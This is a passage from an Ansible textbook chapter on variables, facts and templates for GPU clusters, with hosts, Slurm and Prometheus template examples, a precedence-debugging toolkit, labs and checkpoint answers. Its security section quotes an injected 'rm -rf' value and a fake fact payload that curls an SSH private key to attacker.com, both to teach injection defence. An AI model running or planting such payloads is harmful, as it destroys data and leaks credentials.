The examples below are the templates a GPU team writes most often: a hosts file, a Slurm node list, a Prometheus target list and a YAML dump. Each one starts with data, runs it through a few filters and ends with a file that a service reads. Read each example by tracing one value from the data to the output line it produces.

Suppose a new GPU node joins the cluster, and the Slurm configuration must list it. Editing that file by hand invites mistakes. You might miss the file on one controller, or type a CPU count from memory and get it slightly wrong. A template renders the file from data every time, so the new node appears in the output automatically. A template is a form letter with blanks. The text is fixed, and each blank is filled from the data for that host or that run. The `ansible.builtin.template` module renders `.j2` files (the `.j2` suffix marks a Jinja2 template), reading them from the role's `templates/` directory or from any path you give.

```yaml
- name: Render slurm.conf
  ansible.builtin.template:
    src: slurm.conf.j2
    dest: /etc/slurm/slurm.conf
    owner: slurm
    group: slurm
    mode: "0644"
    backup: true                          # keep a timestamped copy when changed
    validate: "slurmd -f %s -C"           # example: validate before replacing (check the tool's actual option support)
  notify: Reload slurmctld
```

The `backup: true` option keeps a timestamped copy when the file changes, so a bad render can be undone by copying the old file back. The `validate` option checks the rendered file before it replaces the live one. If the checker fails, the live file stays as it was, and that protects a running scheduler from a broken config. The `notify` line runs its handler only when the rendered file changed, which means the scheduler restarts only when there was something to apply.

### Example 1: /etc/hosts for the cluster

![An /etc/hosts template looping over the sorted cluster group with each host's ansible_host, name and domain, showing how a new inventory host gets a new line automatically.](./img/p4-0407-hosts-template-trace.svg)

*Figure 4.7.22. A sorted loop writes one line per host from the inventory, so a new host appears without touching the file.*

Start with the simplest case. A loop over the cluster group writes one line for each host. Read the template as the finished file would look. The first line is a comment that marks the file as generated, so nobody edits it by hand. The second line keeps the local loopback address. The loop then writes one line per host, in sorted order, and the sort keeps the output the same on every render.

```jinja
# {{ ansible_managed }}
127.0.0.1 localhost
{% for h in groups['cluster'] | sort %}
{{ hostvars[h]['ansible_host'] }} {{ h }}.{{ cluster_domain }} {{ h }}
{% endfor %}
```

Each line uses the host's `ansible_host` and its name, so the file follows the inventory. Add a host to the inventory, run the playbook, and the new line appears without anyone touching the file.

### Example 2: Slurm node and GRES configuration derived from data

![A table of each field in a Slurm NodeName line with its hostvars or fact source and default, including 95 percent RealMemory and Gres model and count, with header and partition lines.](./img/p4-0407-slurm-node-line.svg)

*Figure 4.7.23. Each NodeName field comes from hostvars or a fact with a default, and RealMemory leaves 5 percent of memory for the OS and daemon.*

The Slurm example takes the same idea further. It reads each GPU node's CPU count, memory and GPU details from `hostvars`, and it falls back to defaults where a value is missing. Each node gets one `NodeName` line that describes its hardware, and the last line declares the partition that groups them. A partition is Slurm's name for a pool of nodes that a user submits jobs to. The `set v` line gives the long `hostvars` path a short name, which keeps the rest of the loop readable.

```jinja
# {{ ansible_managed }}
ClusterName={{ slurm_cluster_name }}
SlurmctldHost={{ groups['slurm_controller'][0] }}
{% for h in groups['gpu'] | sort %}
{%   set v = hostvars[h] %}
NodeName={{ h }} NodeAddr={{ v.ansible_host }} CPUs={{ v.ansible_facts.processor_vcpus }} Boards=1 SocketsPerBoard={{ v.sockets | default(2) }} CoresPerSocket={{ v.cores_per_socket | default(48) }} ThreadsPerCore=1 RealMemory={{ (v.ansible_facts.memtotal_mb * 0.95) | int }} Gres=gpu:{{ v.gpu_model | default('h100') }}:{{ v.gpu_count | default(8) }} State=UNKNOWN
{% endfor %}
PartitionName=gpu Nodes={{ groups['gpu'] | sort | join(',') }} Default=YES MaxTime=INFINITE State=UP
```

The `RealMemory` value is 95 percent of each node's memory, because the template multiplies by `0.95`. The reason for leaving some memory unused is that the operating system and the Slurm daemon need room too, so the scheduler should never promise every last byte to a job. For large clusters, compress the node list into Slurm's hostlist syntax, such as `gpu[001-032]`, so the file stays short and readable. You can do that with a custom filter or with a precomputed variable.

### Example 3: Prometheus file_sd targets

![A pipeline from the gpu group through extract, a regex_replace appending port 9400 and to_nice_json into a Prometheus file_sd file, beside to_nice_yaml with indent for YAML output validated with yamllint or kubeconform.](./img/p4-0407-file-sd-and-yaml.svg)

*Figure 4.7.24. extract and regex_replace build the file_sd targets, and to_nice_yaml with indent builds YAML that is then validated.*

Prometheus reads targets from a `file_sd` JSON file, where `file_sd` means "file-based service discovery". Prometheus re-reads the file on its own schedule, so a new node added to the file starts being scraped without a restart. This template writes one for the GPU group. Each GPU node gets port 9400 appended to its address, which is where the DCGM exporter listens for GPU metrics in this setup.

```jinja
{# rendered to /etc/prometheus/targets/gpu.json on the monitoring host #}
{{ [{'targets': groups['gpu'] | map('extract', hostvars, 'ansible_host') | map('regex_replace', '$', ':9400') | list,
     'labels': {'job': 'dcgm', 'cluster': cluster_name}}] | to_nice_json }}
```

### Example 4: YAML output from data

Render complex YAML with `to_nice_yaml` instead of indenting it by hand, as in `{{ k8s_values | to_nice_yaml(indent=2) | indent(4) }}`. Hand-indented YAML is fragile, because one space in the wrong place changes the meaning of the whole file. The filter builds the structure correctly every time, and `indent(4)` moves the block to the right depth inside the surrounding template. Then validate the result with `yamllint` or `kubeconform`, so a mistake is caught before the file reaches a cluster.

### Good template practice

![Seven template habits of simple logic, check and diff first, validate with the target's checker, ansible_managed header, no timestamps, sorted output and safe modes for secrets, plus golden file tests.](./img/p4-0407-template-practice.svg)

*Figure 4.7.25. Keep templates simple, sorted and validated, render with check and diff first, and protect secret files.*

Keep the logic in the template simple. Precompute data with `set_fact` or filters first, and put long expressions in variables. A reader who sees a dense line of Jinja has to stop and decode it, but a reader who sees a clear variable name can move on. Always render with `--check --diff` before you run for real. `--check` shows what would change without changing anything, and `--diff` prints the difference line by line, so you can read the change the way a reviewer reads a pull request. Add `validate:` when the file has a syntax checker, such as `nginx -t -c %s`, `visudo -cf %s` or `named-checkconf %s`. The `%s` is replaced with the path of the rendered temporary file, so the checker tests the new text before it goes live.

Include `{{ ansible_managed }}` so that people know not to edit the generated file. A person who edits a generated file by hand will lose the change the next time the playbook runs, so the comment protects both the file and the person. Avoid volatile values such as timestamps, because they change on every run and make the file look changed when it is not. Sort lists and dict keys with `| sort` and `dictsort`. Sorting keeps every render deterministic, so handlers do not flap. Preserve ownership and modes. For secrets, use `0600`, which means only the owner can read or write the file, along with `no_log: true` and `diff: false`, so the secret does not appear in the output. Keep a template test as well. Render the template with fixture data in CI and compare the output to a golden file, which is a saved copy of the output you have already reviewed and approved (3.9).

Sort every list the template reads, and render with `--check --diff` before you change the live file.

## 8. Variable precedence debugging toolkit

![A four rung ladder of inventory view, live host, loaded files and grep search to find an unexpected variable value, with in-play debug checks and the most common precedence surprises.](./img/p4-0407-detective-commands.svg)

*Figure 4.7.26. Ask the inventory, then the live host, then the loaded files, then grep, and expect surprises from role vars, -e, set_fact and replaced dictionaries.*

![Four questions, asked in order, trace an unexpected variable from the inventory view to the live host, the loaded files and finally a search of the repository.](./img/p2-0407-precedence-detective.svg)

*Figure 4.7.27. An unexpected variable is traced in four steps, from the inventory view and the live host to the loaded files and a repository search.*

When a variable shows an unexpected value, guessing is slow and risky. You need to see every layer that defines the variable, and the place each value came from. The toolkit below prints the merged value and points at the layer that won.

Think of this as detective work with a fixed order of questions. Suppose a variable on `gpu001` has a value you did not expect. You do not yet know whether the inventory, a role, a play or the command line set it. The first command asks the inventory what it believes. The second asks the live host what the run would see. The third reads the files that were loaded. The last one searches the whole repository for every place the name appears. Each answer narrows the search, and the first one that shows the wrong value tells you which layer to inspect.

```bash
ansible-inventory -i inventories/prod --host gpu001 --yaml          # merged inventory-level vars
ansible gpu001 -i inventories/prod -m ansible.builtin.debug -a 'var=nvidia_driver_branch'
ansible-playbook site.yml -l gpu001 -e '' -vvv --tags never --list-tasks   # check what is loaded (with -vvv shows vars files)
grep -rn "nvidia_driver_branch" inventories roles playbooks            # find every definition
```

You can also debug from inside a play. `debug: var=vars['nvidia_driver_branch']` prints one value. `debug: msg="{{ hostvars[inventory_hostname] | dict2items | selectattr('key','match','^nvidia_') | list }}"` lists every host variable whose name starts with `nvidia_`. The second one is useful when you suspect a neighbour variable is involved. It turns the host's variables into pairs, keeps only the pairs whose name starts with `nvidia_`, and prints the list. Remember the order summarised in 4.5. In practice, the most common surprises are a role's `vars/` overriding inventory, `-e` overriding everything, `set_fact` persisting into later plays, a dictionary being replaced instead of merged, and two sibling groups defining the same name.

The dictionary surprise deserves a closer look. When a higher layer defines a dictionary, it can replace the whole dictionary from a lower layer, so keys that you set below it quietly disappear. The fix is to merge explicitly with `combine(recursive=True)`, which keeps both sets of keys.

When a value looks wrong, search the repository for its name. A plain `grep` finds the file that set the value, and the line number tells you where to look. Search for the name in quotes, and search for the name with `{{` around it too, because some values are built from other values and the search has to find both forms.

## 9. Security of variables and templates

![A table of secret leak paths through logs, debug output, verbose mode, diffs, readable files, storage, shell injection and untrusted facts, with the setting that closes each one.](./img/p4-0407-secret-leak-paths.svg)

*Figure 4.7.28. Close each leak path with no_log, diff false, mode 0600, Vault, the quote filter and the unsafe marking.*

A variable that holds a password is easy to leak. It can appear in logs, in diffs and in rendered files that anyone with read access can open. This section covers the habits that keep those values out of view while the automation keeps working. A leak is hard to undo. Once a password has been written into a log that a whole team can read, you have to rotate it everywhere it was used, and that is the expensive part.

A registered result or a `debug` line can print a password without anyone intending it. Imagine a debugging session where someone prints a whole variable to see its shape, and the output includes the database password. Keep secrets out of the places where output is shown or stored. The safest habit is to assume that any output may be copied somewhere else.

Secrets belong in Vault-encrypted files, or in a secret manager that you query at runtime (4.12). Set `no_log: true` on any task that handles them, so Ansible hides the task's output from the log. Registered results and `-vvv` output can leak secrets too, so keep both in mind. The `-vvv` flag asks for very detailed output, and that detail can include values you did not mean to show. For rendered secret files, set `diff: false`, so the difference between old and new content is not printed when the file changes.

`lookup('pipe')` and `shell` with interpolated variables are injection vectors. An injection vector is a path by which text from one place becomes a command in another. If a variable holds `; rm -rf /tmp/x` and you paste it into a shell command, the shell runs the extra command too. Quote those values with `| quote`, which wraps the value so the shell treats it as one plain argument.

Facts and registered output from targets are untrusted data, because a compromised host can return anything. Ansible marks some values as unsafe so that they are not re-templated. Do not strip that marking. A string from an untrusted user is dangerous to template, because that is template injection. In that attack, text from outside becomes Jinja2 code that runs on your control node. You should never remove `!unsafe` markings, because the marking is what stops that text from being evaluated.

Quote any target-supplied value before it reaches `lookup('pipe')` or `shell`. Treat the target's answer the way you would treat a stranger's form: useful to read, but never something to execute without checking.

## 10. Lab

Start with a script that needs no servers at all. The self-checking Python lab runs on your own machine, and it confirms that the helper logic behaves as the chapter describes. A self-checking lab is a useful first step, because it proves the logic is sound before you point anything at real machines. If it fails, the problem is in the model, not in your fleet.

```bash
python3 code/part04/ansible_variables_facts_lab.py
```

The lab checks three things. It parses INI and JSON `/etc/ansible/facts.d/*.fact` files into `ansible_local`, using `parse_local_fact_file` as described in *Ansible: Up and Running*, chapter 5. It projects `groups` and `hostvars` across hosts with `project_group_hostvars` and `render_haproxy_backend_from_groups`, and it fails fast when a target's facts were not gathered. That fail-fast check is the same bug you met earlier with `--limit`, now caught by a test. It also runs `dict2items` and `items2dict` transformations through `dict2items_and_items2dict_roundtrip`. A roundtrip means you convert the data one way, convert it back, and check that you end up where you started.

Next, work through the exercises below on a control node with 2–3 Linux targets. The interactive shell steps below have not been run on live hardware, so expect to adjust them on your own setup. Start with step 1 of the lab list, because it sets up the variable layers that the later steps rely on.

1. Define one variable in several layers: role defaults, `group_vars/all`, `group_vars/gpu`, `host_vars`, play vars, `set_fact` and `-e`. Before each run, predict the winner, then run and record the winner at each stage. Finally, place a dict across two layers and merge it with `combine`.
2. Capture `nvidia-smi` output, or a fake script, with `register`. Branch on `rc`, `stdout` and `stdout_lines`. Show how a skipped registered task behaves, and how the `results` of a looped task look.
3. Dump the output of `setup`, and filter it by subset. Compare the run time with and without `gather_facts`, with `gather_subset=min`, and with a JSON file cache.
4. Deploy a `site.fact` file and a script fact. Read `ansible_local` in the next task, then show that the facts persist on the host.
5. Render a cluster-wide `/etc/hosts` with `hostvars` and `groups`. Reproduce the "facts not gathered" bug by limiting the play to one host. Then fix it with a gather play or a cache.
6. Use the `env` and `file` lookups, a `password` that persists between runs, and `first_found` for OS-specific variables. Compare what `lookup` and `query` return inside a loop, and how `hashi_vault` fits into the same picture.
7. Create users from a list of dicts, and generate sysctls from a dict. Try `subelements`, `product` and `batch`. Build a list of GPU node IPs with `map('extract', hostvars, ...)`.
8. Write the hosts, Slurm and Prometheus targets templates. Make the output deterministic, and use `validate:`. Show `--diff` and handler behaviour when only the ordering changes, then sort to fix it.
9. Reproduce a boolean-as-string bug and an unquoted `{{` YAML error. Fix them with `| bool` and with quoting.
10. Add an `assert`, and for a role, an `argument_specs.yml`. Check the failure message for a missing variable.
11. Ask a colleague, or yourself, to plant a conflicting variable in three layers. Find it with the toolkit in under five minutes.
12. Clean up when you finish.

## 11. Common mistakes

![Two lists of variable mistakes, one on defaults, facts and scope and one on formatting and types, with the closing habits of giving optional values defaults and gathering facts before cross-host templating.](./img/p4-0407-mistake-groups.svg)

*Figure 4.7.29. Most variable mistakes come from a variable defined twice, so give values defaults, gather facts first and record which layer owns each one.*

Variable mistakes look like random behaviour. A value changes between runs, or a task uses an old value that you thought was gone. Most of them come from a variable defined in two places, where nobody noticed the second definition. The fix is rarely a clever trick. It is usually a habit, applied before the problem arrives.

Most of the trouble in this chapter comes from a few habits, and you can spot them in your own playbooks. Each one below describes a situation you are likely to meet, followed by the mistake that causes it. The first group covers mistakes about defaults, facts and scope.

- Using variables without defaults or validation, so that missing values surface in the middle of a fleet run.
- Putting overridable settings in role `vars/`, or using `-e` as the normal way to configure a role.
- Treating `set_fact` as a global assignment, and forgetting its host scope and `run_once` behaviour.
- Writing cross-host templates that rely on `hostvars` facts that were never gathered.
- Gathering all facts everywhere on huge fleets, or disabling facts and then using `ansible_*` variables.

The second group is about formatting and types.

- Mixing the old injected names, such as `ansible_distribution`, with `ansible_facts[...]` in the same playbook.
- Producing non-deterministic template output, such as unsorted dicts, sets or timestamps, which restarts handlers for no reason.
- Keeping booleans as strings, or parsing version strings as floats.
- Writing complex Jinja inside YAML where a small module, filter plugin or precomputed variable would be clearer.
- Printing secrets in `debug` output, or in registered variables shown at `-v`.

Give every optional value a default, and gather facts before you template across hosts. If you do both, you will avoid most of the failures above. Keep one more habit in mind as well. Each time you add a variable, write down which layer owns it, so the next person who reads it knows where to change it.

## 12. Interview angles

You can test yourself on this chapter with the questions below. Each one touches an idea you will need to explain. Answer each question in your own words, then check the section that covers it.

- Where do you define variables, and what wins? Think through the precedence summary, role defaults, `group_vars`, `host_vars` and extra vars.
- What are facts? How do you speed up fact gathering, and how would you add custom facts?
- How do you generate per-node configuration, such as Slurm, `/etc/hosts` or Prometheus targets, from the inventory?
- What is `hostvars`, and when does it break?
- How do `register` and `set_fact` differ in scope and lifetime?

The last four questions cover lookups, merging, validation and secrets.

- How do `lookup` and `query` differ, and where do lookups run?
- How do you merge dictionaries from several layers? Consider `combine`.
- How do you validate a rendered configuration before it replaces the live one?
- How do you keep secrets out of logs and diffs?

## Exercises

Each exercise builds on a point from the sections above, so you can check how well you followed them. The first three draw on *Ansible: Up and Running*, chapter 5, and the code in `code/part04/`.

1. A teammate's playbook reads a key named `values` with dot notation and gets a Python method instead of the data. Which notation returns the stored value? Which variable names are valid in Ansible?
2. A `command` task registered `drv`, and a second task reads `drv` after a `when:` condition skipped the first. Which field tells you the command failed? What does `drv` hold when its task was skipped?
3. A new hire asks why the playbook reads `ansible_facts['distribution']` instead of `ansible_distribution`. How would you answer them? Which two settings speed up fact gathering on a large fleet?
4. Your HAProxy load balancer and your Slurm controller both need the addresses of the GPU nodes. Which magic variable lists the group, and which one holds each host's address? Why does a run with `--limit` on one host produce empty addresses, and which two fixes work?
5. A teammate's SSH key lookup fails on the target host. Where does a lookup actually run? Why does `query()` suit a loop better than `lookup()`?
6. A Prometheus targets file must list every GPU node's address with port 9400. Which filter chain builds that list? Why does a `| sort` in the template stop a service from restarting on every run?

## Checkpoint questions (20)

<details>
<summary>1. Why is subscript notation (`result['stat']['mode']` or `d['values']`) safer than dot notation (`d.values`) when accessing dictionaries in Ansible (*Ansible: Up and Running*, chapter 5)?</summary>

In Jinja2 and Ansible, dot notation (`d.key`) can match Python object attributes and methods as well as dictionary keys. If a key has the same name as a built-in `dict` method, such as **`values`**, **`items`**, **`keys`**, **`get`**, **`copy`** or **`update`**, you get the method instead of your data. Writing `d.values` returns `<built-in method values of dict object>`, not the value you stored. Keys with hyphens, dots or spaces, such as `eth0.100` or `ens3-1`, are also syntax errors under dot notation. Subscript notation, **`d['values']`**, always looks up the dictionary key without ambiguity.
</details>

<details>
<summary>2. What is the difference between `register` and `set_fact` in terms of purpose, structure, and persistence?</summary>

- **`register: var_name`** captures the **entire return dictionary** of a task, including `rc`, `stdout`, `stdout_lines`, `stderr`, `changed`, `failed` and `skipped`. With `loop:`, it holds a `results` list instead. If `when:` makes the task skip, `register` still binds `var_name` to `{"changed": false, "skipped": true}`.
- **`ansible.builtin.set_fact`** computes a clean, custom host-scoped variable, such as `current_driver: "{{ drv.stdout_lines[0] | trim }}"`. That value persists across all the remaining plays in the run. With **`cacheable: true`** and fact caching enabled in `ansible.cfg`, the computed fact is also written to the fact cache (`ansible_facts`) for future runs.
</details>

<details>
<summary>3. What Happens when `set_fact` or `register` is used on a task with `run_once: true`?</summary>

Both `set_fact` and `register` store their variables in the `hostvars` of the hosts that actually ran the task. With **`run_once: true`**, the task runs only on the first host in the batch, `ansible_play_batch[0]`. There is one convenience, though. A `set_fact` or `register` on a `run_once: true` task automatically copies its value to every host in the current play batch. The exception is when `delegate_to` and `delegate_facts: true` are combined, because then the fact goes solely to the delegated host.
</details>

<details>
<summary>4. Why should modern playbooks use `ansible_facts['distribution']` instead of the top-level variable `ansible_distribution`?</summary>

Older Ansible injected every gathered fact as a top-level `ansible_*` variable, such as `ansible_distribution`, `ansible_kernel` and `ansible_os_family`. That filled the global variable namespace. It also let a compromised remote host, returning custom facts, collide with connection and configuration variables. Reading facts from the **`ansible_facts` dictionary**, such as `ansible_facts['distribution']` or `ansible_facts['default_ipv4']['address']`, keeps all discovered host data namespaced. It also works when `inject_facts_as_vars = False` is set in `ansible.cfg`.
</details>

<details>
<summary>5. How do Custom Local Facts in `/etc/ansible/facts.d/*.fact` work (*Ansible: Up and Running*, chapter 5, example 5-10)?</summary>

During the `setup` step, Ansible looks in **`/etc/ansible/facts.d/`** on the target for any file that ends in **`.fact`**.
- A **non-executable** file is parsed as **INI**, such as `/etc/ansible/facts.d/example.fact` with `[book]` followed by `title=Ansible: Up and Running`, or as **JSON**.
- An **executable file (`chmod 0755`)** runs on the target, and Ansible parses its **`stdout` as JSON**. For example, `/etc/ansible/facts.d/gpu.fact` prints `{"count": 8}`.

Either way, the result appears under **`ansible_local.<filename_without_ext>`**, such as `ansible_local.example.book.title` or `ansible_local.gpu.count`, and also under `ansible_facts['ansible_local']`.
</details>

<details>
<summary>6. What is the difference between `hostvars` and `host_vars/`, and how do `groups` and `hostvars` work together in cross-host templates (*Ansible: Up and Running*, chapter 5)?</summary>

- **`host_vars/`** (with an underscore) is an **on-disk directory** in your repository. It holds static per-host YAML variable files, such as `inventories/prod/host_vars/gpu001.yml`.
- **`hostvars`** (no underscore) is a **runtime magic dictionary** in memory. It maps every hostname in the inventory to all of that host's resolved variables and gathered facts, such as `hostvars['db.example.com']['ansible_default_ipv4']['address']`.

To render a load-balancer (`haproxy.cfg`), `/etc/hosts` or `slurm.conf` template that needs the addresses and hardware facts of every node in a group, iterate over **`groups['gpu']`** and index into **`hostvars[h]`**: `{% for h in groups['gpu'] | sort %}{{ hostvars[h]['ansible_host'] }} {{ h }}{% endfor %}`.
</details>

<details>
<summary>7. Why does a template using `hostvars[h]['ansible_facts']['processor_vcpus']` fail with an `UndefinedError` when you run `ansible-playbook site.yml --limit slurmctl01`, and how do you fix it?</summary>

With `--limit slurmctl01`, Ansible runs the play, including `gather_facts: true`, **only on `slurmctl01`**. `hostvars['gpu001']` still holds `gpu001`'s static inventory variables, such as `ansible_host`. It holds none of `gpu001`'s runtime `ansible_facts`, because `setup` never ran on `gpu001`. You can fix this in one of two ways.
1. Enable **fact caching** with `gathering = smart` and `fact_caching = jsonfile`, so that `hostvars` loads cached facts for all hosts.
2. Add a dedicated fact-gathering play at the top of `site.yml`, such as `- hosts: cluster / gather_facts: true / tasks: []`. Or delegate fact gathering across `groups['gpu']` with `setup`, `delegate_to: "{{ item }}"` and `delegate_facts: true`.
</details>

<details>
<summary>8. Where do Ansible Lookups (`lookup`, `query`) execute, and how do `lookup()` and `query()` (`q()`) differ?</summary>

**Every lookup executes on the Ansible control node**, never on the remote target hosts, at the moment the Jinja2 expression is templated.
- **`lookup('file', 'a.txt', 'b.txt')`** returns a comma-separated **string** by default, unless you pass `wantlist=True`.
- **`query('file', 'a.txt', 'b.txt')`**, or **`q(...)`**, always returns a Python **`list`**. That makes `query()` the safer choice when you feed a lookup into `loop:`.
</details>

<details>
<summary>9. How does `lookup('password', ...)` work for idempotent credential generation?</summary>

`lookup('password', 'credentials/mysql_pass chars=ascii_letters,digits length=24')` checks whether the local file `credentials/mysql_pass` exists on the control node. If it does not, Ansible generates a random 24-character password and writes it to that file. On every later run, it reads the existing password from the file and returns it. That makes random password generation idempotent across playbook runs. Store the generated directory in Vault or in a secure local path.
</details>

<details>
<summary>10. Compare loading OS-specific variables via `vars_files` with `ansible.builtin.first_found`.</summary>

- **`vars_files: ["vars/{{ ansible_facts['os_family'] | lower }}.yml"]`** loads `vars/debian.yml` or `vars/redhat.yml` once facts are gathered.
- **`include_vars: "{{ lookup('ansible.builtin.first_found', params) }}"`** searches an ordered list of candidate files, from most specific to least specific. For example: `["{{ ansible_facts['distribution'] }}-{{ ansible_facts['distribution_version'] }}.yml", "{{ ansible_facts['os_family'] }}.yml", "default.yml"]`. It loads the **first file that exists**, so unfamiliar distributions fall back to `default.yml`.
</details>

<details>
<summary>11. How does the `extract` filter (`map('extract', hostvars, ...)`) project attributes across a group of hosts without writing a `{% for %}` loop?</summary>

Given a list of hostnames in `groups['gpu']`, such as `['gpu001', 'gpu002']`, piping it into **`map('extract', hostvars, 'ansible_host') | list`** looks up `hostvars[h]['ansible_host']` for each name `h`. The result is `['10.1.10.1', '10.1.10.2']`. For nested facts, pass a list of path keys as the third argument, such as `groups['gpu'] | map('extract', hostvars, ['ansible_facts', 'default_ipv4', 'address']) | list`.
</details>

<details>
<summary>12. How do `dict2items`, `items2dict`, and `subelements` transform data structures for `loop:`?</summary>

- **`dict2items`** turns `{"vm.swappiness": 1, "kernel.numa_balancing": 0}` into `[{"key": "vm.swappiness", "value": 1}, {"key": "kernel.numa_balancing", "value": 0}]`, so a `sysctl` task can loop over `{{ item.key }}` and `{{ item.value }}`.
- **`items2dict`** reverses that, turning a list of `key` and `value` dicts back into a single dictionary.
- **`subelements('keys')`** flattens a one-to-many list, such as users who each hold a list of SSH public `keys`, into `(user_dict, single_key)` pairs (`item.0.name` and `item.1`). That lets `authorized_key` install every key for every user in one task.
</details>

<details>
<summary>13. Why is `package: { name: [chrony, rsync, htop, tmux], state: present }` much faster than using `loop: [chrony, rsync, htop, tmux]`?</summary>

When you pass a list straight to **`package:`, `apt:` or `dnf:`** (`name: [chrony, rsync, htop, tmux]`), Ansible calls `apt-get` or `dnf` **once, in a single package-manager transaction**, over one SSH execution. With `loop:`, Ansible uploads and runs the module **four separate times**. Each run makes `apt` or `dnf` lock the RPM or dpkg database, parse the metadata cache and resolve dependencies again, so the four passes add up.
</details>

<details>
<summary>14. What does `loop_control: { label: "{{ item.name }}", index_var: idx, pause: 2 }` do?</summary>

By default, a `loop:` over large dictionaries, such as user records with SSH keys or password hashes, prints the **entire dictionary for every item**. That clutters the log and risks exposing secrets. With **`loop_control: { label: "{{ item.name }}" }`**, the output shows only `item.name`, such as `ok: [gpu001] => (item=slurm)`. **`index_var: idx`** exposes the 0-based loop counter as `idx`, and **`pause: 2`** waits 2 seconds between iterations.
</details>

<details>
<summary>15. How do Ansible's network and unit filters (`ansible.utils.ipaddr`, `human_to_bytes`, `ternary`, `combine`) simplify infrastructure templates?</summary>

- **`'10.1.0.0/24' | ansible.utils.ipaddr('10')`** computes the 10th usable address in the subnet, `10.1.0.10/24`. It also validates IP and CIDR formats, and it can extract network and broadcast addresses.
- **`'64 GB' | human_to_bytes`** converts a human-readable size string into an exact byte integer.
- **`is_prod | ternary('warn', 'debug')`** is an inline conditional. It returns `'warn'` when `is_prod` is truthy, and `'debug'` when it is falsy.
- **`base_cfg | combine(override_cfg, recursive=True)`** merges nested dictionaries recursively, instead of replacing the top-level keys.
</details>

<details>
<summary>16. How do you render embedded YAML or JSON blocks cleanly inside a `.j2` template (`to_nice_yaml` + `indent`, `to_nice_json`)?</summary>

Never format complex nested YAML or JSON by hand inside a Jinja `{% for %}` loop. One missing space or trailing comma on the last element breaks the file. Build the data structure in Ansible variables or filters, and serialise it with **`{{ my_data | to_nice_json }}`** or **`{{ k8s_values | to_nice_yaml(indent=2) | indent(4) }}`**. Those filters guarantee valid output, with deterministic indentation.
</details>

<details>
<summary>17. Why can an un-sorted dictionary or set in a Jinja2 template cause unnecessary service restarts across a fleet, and how do you prevent it?</summary>

If a template iterates over an unsorted list, such as `groups['gpu']`, or over a set, the line order in the rendered file can change with it. A change in inventory order, or in Python's set iteration order, makes `template` report **`changed: true`**, and that fires **`notify: Restart slurmctld`**. The semantic configuration did not change, but the service restarts anyway. Always pipe collections through **`| sort`**, and dictionaries through **`| dictsort`**, inside templates.
</details>

<details>
<summary>18. How does lazy variable evaluation (`b: "{{ a }}-suffix"`) work in Ansible, and what error occurs if you write `x: "{{ x }}-1"` in `group_vars`?</summary>

Ansible stores variables in `group_vars`, `host_vars` and `vars:` as unevaluated templates. It evaluates `{{ ... }}` **lazily**, at the moment a task or template consumes the variable. That lets you define `driver_pkg: "nvidia-driver-{{ nvidia_driver_branch }}"` once in `group_vars/all.yml`, while overriding `nvidia_driver_branch: 555` in `host_vars/gpu033.yml`. Defining a variable in terms of itself, such as `x: "{{ x }}-1"` in a static variable file, creates an infinite self-reference, and Ansible reports **`recursive loop detected in template string`**. If you need to rebind a variable based on its previous value, use `set_fact`.
</details>

<details>
<summary>19. What is the fastest workflow for debugging "why did variable `X` get this unexpected value on `gpu001`?"</summary>

1. Check the merged static inventory and the `group_vars` and `host_vars` resolution without running a playbook: `ansible-inventory -i inventories/prod --host gpu001 --yaml`
2. If the value differs at runtime inside a play, look for higher-precedence overrides: play `vars:`, `vars_files:`, role `vars/`, `set_fact` and `-e`. Run `grep -rn "nvidia_driver_branch" inventories/ roles/ playbooks/`, and print the value with `ansible gpu001 -i inventories/prod -m debug -a "var=nvidia_driver_branch"`.
</details>

<details>
<summary>20. Why are facts and registered outputs from target hosts considered untrusted data on the control node?</summary>

A compromised target host controls what `/usr/bin/python3` and `/etc/ansible/facts.d/*.fact` return over SSH, because the remote root user controls them. Suppose a fact contains `{{ lookup('pipe', 'curl attacker.com -d @~/.ssh/id_ed25519') }}`. If the control node re-evaluated that string as a Jinja2 template, the target would compromise the control node. Ansible prevents this by wrapping remote facts and registered strings in **`AnsibleUnsafeText` (`!unsafe`)**. Playbooks must never strip that wrapper, and they must never pass remote output into `lookup('pipe', ...)` without `| quote`.
</details>

## Sources and review notes

- **Sources read in full:**
  - `ansible-up-and-running-3rd-edition` — Bas Meijer, Lorin Hochstein & René Moser, *Ansible: Up and Running*, 3rd ed., **Chapter 5: Variables and Facts** (read in full: defining variables in playbooks and `vars_files: [nginx.yml]`, string concatenation with `~`, variable naming restrictions, `register` capturing `command` and `stat` results, subscript `result['stat']['mode']` vs dot `result.stat.mode` and Python dict method collisions like `.values`, `setup` module facts and `filter=`, local custom facts in `/etc/ansible/facts.d/example.fact` accessed via `ansible_local.example.book.title`, `set_fact`, built-in magic variables `hostvars` vs `host_vars/`, `inventory_hostname`, and `groups` iterating `groups.web` for HAProxy `backend web-backend`, and `-e @greetvars.yml` extra vars precedence).
- **Run here:** `python3 code/part04/ansible_variables_facts_lab.py` (3 passed, 0 failed).
- **Explicitly labelled inferences:** The `parse_local_fact_file`, `project_group_hostvars`, `render_haproxy_backend_from_groups`, and `dict2items_and_items2dict_roundtrip` models in `code/part04/ansible_variables_facts.py` and the `/etc/hosts`, `slurm.conf.j2`, and Prometheus `file_sd` `gpu.json` templates are the author's constructions applying *Ansible: Up and Running* Chapter 5 to GPU cluster configurations (plus original study items 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, and 35).
- **Not verified on live hardware:** Live `ansible`, `ansible-playbook`, `setup`, `slurmd -f %s -C`, and HashiCorp Vault lookup commands (`550`, `550.90.07`, `1024`, `990`, `991`, `10.1.0.0/24`, `9400`, `203.0.113.15..38`, `0755`, `0644`, `0600`) are marked as not run in this chapter where `ansible_variables_facts_lab.py` does not execute them.
